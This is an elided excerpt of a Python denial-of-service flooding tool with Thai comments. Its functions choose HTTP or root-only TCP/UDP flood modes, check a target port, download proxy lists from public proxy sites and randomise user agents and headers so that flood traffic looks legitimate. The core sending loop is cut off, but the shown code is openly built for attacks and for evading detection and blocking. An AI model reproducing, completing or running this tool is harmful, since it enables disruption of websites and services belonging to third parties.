...
def starturl(): # ในฟังก์ชั่นนี้ตั้งค่า url เพื่อให้ใช้งานได้สำหรับการตั้งค่าคำขอ HTTP ในอนาคต
	global url
	global url2
	global urlport
...
def floodmode(): # ทางเลือกของโหมดการโจมตี
	global choice1
	choice1 = input("Do you want to perform HTTP flood '0'(best) ? ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # หากโปรแกรมไม่ได้ทำงานในฐานะ root:
				print("You need to run this program as root to use TCP/UDP flooding.") # พิมพ์สิ่งนี้
				exit(0) # และออกไป
			else: # ไม่งั้น
				floodport() # ให้มันดำเนินต่อไป
		except:
			pass
	elif choice1 == "2":
		try:
			if os.getuid() != 0: # หากโปรแกรมไม่ได้ดำเนินการเป็นไฟล์ root:
				print("You need to run this program as root to use TCP/UDP flooding.") # พิมพ์สิ่งนี้
				exit(0) # และออกไป
			else: # ไม่งั้น
				floodport() # ให้มันดำเนินต่อไป
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # ช่วงของพอร์ตคอมพิวเตอร์ทั้งหมด
		if port in portlist: # หากพอร์ตที่เลือกอยู่ในช่วง
			pass # ให้มันดำเนินต่อไป
		else: # ไม่งั้น
			print ("You mistyped, try again.")
			floodport() # ฟังก์ชันจะรีสตาร์ทและทำให้คุณเขียนใหม่
	except ValueError: # หากให้ค่าผิดพลาด
		print ("You mistyped, try again.") # พิมพ์สิ่งนี้และ
		floodport() # ฟังก์ชันจะรีสตาร์ทและทำให้คุณเขียนใหม่
	proxymode()
...
def proxyget(urlproxy): # ชื่อบอกว่ามันฟังก์ชั่นนี้ดาวน์โหลดพร็อกซี
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # ที่นี่เราตั้งค่าไซต์จากที่ที่จะดาวน์โหลด
		req.add_header("User-Agent", random.choice(useragents)) # เนื่องจากรูปแบบของไซต์เหมือนกันทั้งคู่
		sourcecode = urllib.request.urlopen(req)                # สำหรับ free-proxy-list.net และสำหรับ socks-proxy.net
		part = str(sourcecode.read())                           # ฉันตั้งค่าตัวแปร url proxy ตามสิ่งที่คุณเลือก
	...
	except: # หากมีปัญหาเกิดขึ้น
		print ("\nERROR!\n")
	proxylist() # หากทุกอย่างเป็นไปอย่างราบรื่นให้ดำเนินการต่อโดยเรียกใช้ฟังก์ชัน proxylist ()
...
def loop():
	...
	global go
	global x
	if choice1 == "0": # หากคุณเลือก http flood ระบบจะเขียนส่วนหัว "แบบคงที่" เพื่อไม่ให้เธรดเป็นภาระ
		...
		] # header ยอมรับแบบสุ่มเพื่อให้คำขอดูเหมือนถูกต้องตามกฎหมายมากขึ้น
